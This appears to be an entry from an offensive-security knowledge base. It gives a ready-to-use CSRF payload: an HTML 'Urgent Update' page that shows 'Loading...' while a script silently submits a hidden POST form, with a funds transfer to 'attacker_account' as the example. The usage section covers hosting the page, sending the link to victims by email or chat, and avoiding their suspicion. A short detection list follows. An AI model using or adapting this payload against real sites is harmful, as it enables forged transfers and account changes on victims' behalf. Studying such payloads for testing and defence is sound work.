---
type: code
language: html
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - web
tags:
  - csrf
  - payload
  - html
validated: true
---

# CSRF-Hidden-Form-HTML

## Code

```html
<!DOCTYPE html>
<html>
<head>
    <title>Urgent Update</title>
    <!-- Optional: Meta refresh as fallback, but JS is primary -->
</head>
<body>
    <h1>Loading...</h1>
    <form id="csrfForm" method="POST" action="$_TARGET_URL">
        <input type="hidden" name="$_PARAM1" value="$_VALUE1" />
        <input type="hidden" name="$_PARAM2" value="$_VALUE2" />
        <!-- Add more hidden fields as needed for the target action -->
    </form>
    <script>
        // Auto-submit the form on load to trigger CSRF
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```

## Description

This HTML code creates a malicious page that displays a loading message while automatically submitting a hidden form via JavaScript to the target web application's endpoint. The form mimics a legitimate POST request (e.g., for transferring funds or changing settings). The Referer header will be the URL of this hosted page, which can bypass weak validation if the hosting domain resembles the target's or if checks are substring-based.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_TARGET_URL | The vulnerable endpoint URL on the target app | https://target.com/transfer |
| $_PARAM1 | First form parameter name (e.g., amount) | amount |
| $_VALUE1 | Value for the first parameter | 1000 |
| $_PARAM2 | Second form parameter name (e.g., to_account) | to |
| $_VALUE2 | Value for the second parameter | attacker_account |

## Usage

Save the code as index.html, substitute parameters based on the target's form (inspect via browser dev tools). Host using [[commands/host-simple-web-server]] and send the link to the victim via email or chat. The page loads, submits the form silently, and redirects or shows a fake message to avoid suspicion. Test against a vulnerable app like DVWA.

## Detection

- Web application logs showing POST requests with unexpected Referer domains.
- Browser console errors or network tab revealing auto-submits from untrusted sites.
- CSP violations if strict policies are in place.
- User reports of unexpected actions after visiting links.

## Related

- [[procedures/CSRF-Attack-Bypassing-Referer-Validation]]
